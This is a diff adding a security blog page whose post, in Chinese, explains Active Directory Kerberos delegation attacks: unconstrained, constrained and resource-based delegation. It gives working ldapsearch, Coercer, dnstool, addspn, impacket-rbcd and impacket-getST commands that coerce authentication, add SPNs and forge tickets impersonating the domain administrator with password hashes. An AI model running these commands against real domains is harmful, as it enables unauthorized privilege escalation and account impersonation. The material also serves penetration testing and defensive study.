@@ -1,0 +1,370 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>Page 4 | ShadowMccc&#39;s Blog</title>
+  <meta name="author" content="ShadowMccc">
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  
+  <meta property="og:site_name" content="ShadowMccc&#39;s Blog"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+    <link rel="alternative" href="/atom.xml" title="ShadowMccc&#39;s Blog" type="application/atom+xml">
+  
+  
+    <link href="/favicon.png" rel="icon">
+  
+  
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/prism.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/js/jquery-2.0.3.min.js"></script>
+
+  <!-- analytics -->
+  
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-70812759-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-70812759-1');
+</script>
+
+
+
+
+
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">ShadowMccc&#39;s Blog</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="All the articles.">
+			  <i class=""></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/categories" title="All the categories.">
+			  <i class=""></i>Categories
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/tags" title="All the tags.">
+			  <i class=""></i>Tags
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/about" title="About me.">
+			  <i class=""></i>About
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/atom.xml" title="Subscribe me.">
+			  <i class=""></i>RSS
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 <div class="page-header logo">
+  <h1>ShadowMccc&#39;s Blog<span class="blink-fast">|</span></h1>
+</div>
+
+<div class="row page">
+
+	
+	<div class="col-md-9">
+	
+
+		<div class="slogan">
+
+
+		<i class="fa fa-heart blink-slow"></i>
+
+		Beneath this mask there is more than fIesh.Beneath this mask there is an idea, Mr. Creedy.And ideas are bulletproof.
+
+</div>    
+
+		<div id="top_search"></div>
+		<div class="mypage">
+		
+		<!-- title and entry -->
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
+			<a href="/2024/12/01/AD-kerberos中的委派/" >AD-Kerberos中的委派</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2024-12-01  </div>
+		</div>
+	</div>
+	
+
+
+			<div class="entry">
+  <div class="row">
+	
+	
+		<h2><span id="非约束性委派trusted_for_delegation">非约束性委派（TRUSTED_FOR_DELEGATION）</span></h2><p>非约束性委派是 Windows 2000 中唯一支持的委派类型。当用户在启用了非约束性委派的服务器上请求服务票证时，用户的票证授权票证（TGT）会被嵌入到服务票证（ST）中，并将该服务票证交给服务器。服务器可以将该票证缓存在内存中，并在后续的资源请求中代表用户进行域内访问。</p>
+<p>如果未启用非约束性委派，服务器只会将用户的票证授权服务票证（TGS Ticket）存储在内存中。在这种情况下，如果服务器被攻破，攻击者只能在该用户的上下文中访问 TGS Ticket中指定的资源，而无法冒充用户进行其他访问。</p>
+<h3><span id="computer">computer</span></h3><p>通过各种方法查询非约束性委派的机器</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜  kali proxychains ldapsearch -x -H ldap://192.168.1.1:389 -D <span class="string">&#x27;123@123.com&#x27;</span> -w <span class="string">&#x27;123&#x27;</span> -b <span class="string">&quot;dc=123,dc=com&quot;</span> <span class="string">&quot;(&amp;(userAccountControl:1.2.840.113556.1.4.803:=524288)(objectclass=computer)(objectCategory=computer))&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>然后等待管理员登录该机器或者通过强制认证进行攻击</p>
+<p>使用Coercer让域控对已控的启用了非约束性委派的机器进行认证（使用主机名称）</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜  kali proxychains python3 Coercer.py coerce -u <span class="string">&#x27;123&#x27;</span> -p <span class="string">&#x27;123&#x27;</span> -d 123.com -t dc -l server</span><br></pre></td></tr></table></figure>
+
+<p>使用各种工具在已控机器上获取TGT</p>
+<p><img src="/images/14.png" alt="14"></p>
+<p>自己写的查看tgt的小工具</p>
+<h3><span id="user">user</span></h3><p>需要给存在非约束性委派的用户添加SPN的权限</p>
+<p>需要一台已控的机器linux&#x2F;windows</p>
+<p>通过各种方法查询非约束性委派的用户</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜  kali proxychains ldapsearch -x -H ldap://192.168.1.1:389 -D <span class="string">&#x27;123@123.com&#x27;</span> -w <span class="string">&#x27;123&#x27;</span> -b <span class="string">&quot;dc=123,dc=com&quot;</span> <span class="string">&quot;(&amp;(userAccountControl:1.2.840.113556.1.4.803:=524288)(objectclass=user)(objectCategory=person))&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>使用dnstool添加一条dns记录将test.123.com指向192.168.1.2</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜  kali proxychains python dnstool.py 192.168.1.1 -u 123.com\\123 -p 123 -r test.123.com -d 192.168.1.2 --action add</span><br></pre></td></tr></table></figure>
+
+<p>使用addspn给非约束性委派的用户添加SPN</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜  kali proxychains python addspn.py -u 123.com\\123 -p 123 --target-type samname -t testa -s CIFS/test.123.com dc.123.com</span><br></pre></td></tr></table></figure>
+
+<h2><span id="约束性委派">约束性委派</span></h2><p>约束性委派（Constrained Delegation）是指在 <strong>Active Directory (AD)</strong> 中通过严格的权限控制，允许某个服务账户代表用户访问其他服务或资源的委派机制。与 <strong>非约束性委派（Unconstrained Delegation）</strong> 不同，约束性委派只允许服务在特定的条件下代表用户执行操作，从而提供更高的安全性。</p>
+<p>对于 非约束性委派，用户的 TGT 副本会被发送到服务账户，但在约束性委派中并非如此。如果服务账户希望代表用户向资源（如 www&#x2F;websrv）进行身份验证，它必须向域控制器发出一个特殊的 TGS 请求。与普通的 TGS 请求相比，有两个字段将被修改。</p>
+<ol>
+<li>附加票证字段 将包含用户发送给服务的 TGS 票证或服务票证（ST）的副本。</li>
+<li>cname-in-addl-tkt 标志将被设置，以指示域控制器它不应该使用服务器信息，而应使用附加票证中的票证信息，即用户的身份信息，表示服务器希望模拟的用户。</li>
+</ol>
+<p>然后，域控制器将验证该服务是否有权将身份验证委派给请求的资源，并且 TGS 票证或服务票证的副本是否可转发（默认情况下是可转发的，但如果用户的 UAC 标志中设置了 <strong>账户敏感且不能被委派，则该选项会被禁用</strong>）。如果一切正常，域控制器将向服务返回一个 TGS 票证或服务票证，其中包含被委派用户的信息，以便访问最终资源。</p>
+<h3><span id="带协议转换的约束性委派启用s4u2self">带协议转换的约束性委派(启用S4U2Self)</span></h3><p><strong>S4U2Self 扩展</strong>允许服务账户代表任意用户请求一个可转发的 TGS 票证。当用户通过 NTLM 等协议认证到服务时，服务首先代表该用户请求一个可转发的 TGS 票证，仿佛用户是通过 Kerberos 认证的。获得该 TGS 票证后，服务可以使用它发起自己的 TGS 请求（S4U2Proxy），访问所需的资源。</p>
+<p>该扩展实现了<strong>协议转换</strong>，使得即使用户与服务之间使用不同的认证协议，也能进行委派。</p>
+<p>在 <strong>约束性委派</strong> 中，可以启用或禁用此功能。如果选择<strong>仅使用 Kerberos</strong>，则服务账户无法进行协议转换，因此无法使用 S4U2Self 扩展；而选择<strong>使用任何身份验证协议</strong>时，服务账户可以使用 S4U2Self 扩展，进而<strong>为任意用户请求 TGS 票证</strong>。</p>
+<p>通过各种方法查询带协议转化的约束性委派的账户</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜  kali proxychains ldapsearch -x -H ldap://192.168.1.1:389 -D <span class="string">&#x27;123@123.com&#x27;</span> -w <span class="string">&#x27;123&#x27;</span> -b <span class="string">&quot;dc=123,dc=com&quot;</span> <span class="string">&quot;(&amp;(msDS-AllowedToDelegateTo=*)(userAccountControl:1.2.840.113556.1.4.803:=16777216))&quot;</span> <span class="string">&quot;samaccountname&quot;</span> <span class="string">&quot;msDS-AllowedToDelegateTo&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/15.png" alt="15"></p>
+<p>使用impacket-getST模拟任意用户(非敏感&#x2F;保护账户)请求目标的服务的票据并修改spn以达到访问目标暴露的其他服务的目的</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜  kali proxychains impacket-getST -spn www/test.123.com -hashes :86e656e11111fc0a014e81111a4caeae <span class="string">&#x27;123.com/123&#x27;</span> -impersonate administrator -dc-ip 192.168.1.1 -altservice cifs</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/16.png" alt="16"></p>
+<h3><span id="不带协议转换的约束性委派">不带协议转换的约束性委派</span></h3><p>如果服务配置了约束性委派且没有启用协议转换（即设置为“仅使用 Kerberos”），那么 S4U2Self 请求将不会生成可转发的服务票证，因此无法满足 S4U2Proxy 的要求。</p>
+<p>在这种情况下可以结合RBCD（基于资源的约束性委派）来模拟协议转换</p>
+<p>首先必要的条件如下：</p>
+<ol>
+<li>攻击者拥有一个具有SPN的账户或者机器账户的权限（ServerA）</li>
+<li>攻击者拥有一个设置了对目标服务C的不带协议转换的约束性委派的服务账户B，需要可以修改其msDS-AllowedToActOnBehalfOfOtherIdentity属性</li>
+</ol>
+<p>首先将A加入到B的信任列表中</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜  kali proxychains impacket-rbcd -delegate-from <span class="string">&#x27;ServerA$&#x27;</span> -delegate-to <span class="string">&#x27;ServerB$&#x27;</span> -dc-ip 192.168.1.1 -action <span class="string">&#x27;write&#x27;</span> -hashes :123123123aaaa129bb8b655728aaaa145 123.com/user1</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/17.png" alt="17"></p>
+<p>然后使用A$通过S4U模拟任意用户获得一张可以转发的服务B的TGS</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜  kali proxychains impacket-getST -hashes :123123123123123123213 -spn cifs/ServerB.123.com <span class="string">&#x27;123.com/ServerA$&#x27;</span> -impersonate <span class="string">&quot;administrator&quot;</span> -dc-ip 192.168.1.1</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/18.png" alt="18"></p>
+<p>使用B$指定使用之前获得的可转发的TGS来作为S4U2Self获取到的TGS（附加票据），然后使用S4U2Proxy将之前指定的票据作为附加票据（证明用户身份，且可以转发）为B$请求一张模拟的用户到目标服务C的TGS</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜  kali proxychains impacket-getST -hashes :123123123123123123123 -spn cifs/dc.123.com -additional-ticket ./administrator@cifs_ServerB.123.com@123.COM.ccache -impersonate administrator <span class="string">&#x27;123.com/ServerB$&#x27;</span> -dc-ip 192.168.1.1</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/19.png" alt="19"></p>
+<h2><span id="基于资源的约束性委派dcgtx3dwinserver-2012">基于资源的约束性委派（DC&gt;&#x3D;winserver 2012）</span></h2><p>“基于资源的约束性委派（RBCD）”是在 Windows Server 2012 中引入的。这种委派类型允许在目标服务上配置委派，而不是依赖于用于访问资源的服务帐户。</p>
+<p>RBCD 依赖于安全描述符而不是允许的 SPN 列表。管理员可以定义哪些安全主体可以代表某个用户请求 Kerberos 票证。当服务收到代表其他用户授予访问权限的请求时，KDC 会检查运行后端服务的主体的 msDS-AllowedToActOnBehalfOfOtherIdentity 属性中的安全描述符。</p>
+<p>如果后端服务的安全描述符与前端服务的安全描述符匹配，则会授予访问权限。RBCD 不受域功能级别的限制，但要求至少有一个域控制器运行 Windows Server 2012 或更高版本，并且后端和前端服务器必须位于同一域中。</p>
+<p>利用条件：</p>
+<ul>
+<li><p>拥有一个具有SPN的账户或者机器账户（可以自行添加机器）（ServerA）</p>
+</li>
+<li><p>能够修改目标机器(ServerB)的msDS-AllowedToActOnBehalfOfOtherIdentity属性</p>
+</li>
+</ul>
+<p>通过RBCD将A添加到B的信任列表中</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜  kali proxychains impacket-rbcd -delegate-from <span class="string">&#x27;ServerA$&#x27;</span> -delegate-to <span class="string">&#x27;ServerB$&#x27;</span> -dc-ip 192.168.1.1 -action <span class="string">&#x27;write&#x27;</span> -hashes :123123123213123 vensec.com/administrator</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/20.png" alt="20"></p>
+<p>使用ServerA模拟任意用户请求serverB的TGS</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜  kali proxychains impacket-getST -hashes :123123123123123123213 -spn cifs/serverB.123.com -impersonate administrator <span class="string">&#x27;123.com/ServerA$&#x27;</span> -dc-ip 192.168.1.1</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/21.png" alt="21"></p>
+
+	
+	</div>
+  <a type="button" href="/2024/12/01/AD-kerberos中的委派/#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+
+		</div>
+
+		<!-- pagination -->
+		<div>
+  		<center>
+		<div class="pagination">
+
+   
+    
+     <a href="/page/3/" type="button" class="btn btn-default"><i class="fa fa-arrow-circle-o-left"></i> Prev</a>
+      
+
+        <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+ 
+       <a href="/page/5/" type="button" class="btn btn-default ">Next<i class="fa fa-arrow-circle-o-right"></i></a>     
+        
+
+  
+</div>
+
+  		</center>
+		</div>
+
+		
+		
+	</div> <!-- col-md-9 -->
+
+	
+		<div class="col-md-3">
+	<div id="sidebar">
+	
+			
+  <div id="site_search">
+   <div class="form-group">
+    <input type="text" id="local-search-input" name="q" results="0" placeholder="Search" class="st-search-input st-default-search-input form-control"/>
+   </div>  
+  <div id="local-search-result"></div>
+  </div>
+
+
+		
+			
+		
+			
+
+		
+			
+<div class="widget">
+  <h4>Recent Posts</h4>
+  <ul class="entry list-unstyled">
+    
+      <li>
+        <a href="/2024/12/10/OffensiveWindows攻击平台搭建/" ><i class="fa fa-file-o"></i>OffensiveWindows攻击平台搭建</a>
+      </li>
+    
+      <li>
+        <a href="/2024/12/03/AD-NTLM Relay/" ><i class="fa fa-file-o"></i>AD-NTLM Relay</a>
+      </li>
+    
+      <li>
+        <a href="/2024/12/01/AD-滥用DACL/" ><i class="fa fa-file-o"></i>AD-滥用DACL</a>
+      </li>
+    
+      <li>
+        <a href="/2024/12/01/AD-kerberos中的委派/" ><i class="fa fa-file-o"></i>AD-Kerberos中的委派</a>
+      </li>
+    
+      <li>
+        <a href="/2024/11/29/解密chrome浏览器账号密码/" ><i class="fa fa-file-o"></i>解密chrome浏览器账号密码</a>
+      </li>
+    
+  </ul>
+</div>
+
+		
+			
+<div class="widget">
+	<h4>Links</h4>
+	<ul class="blogroll list-unstyled">
+	
+		<li><i class="false"></i><a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" title="" target="_blank"]);">hexo-theme-bithack</a></li>
+	
+	</ul>
+</div>
+
+
+		
+	</div> <!-- sidebar -->
+</div> <!-- col-md-3 -->
+
+	
+	
+</div> <!-- row-fluid -->
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  
+  &copy; 2024 ShadowMccc's Blog
+  
+      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
+</p>
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+</body>
+   </html>
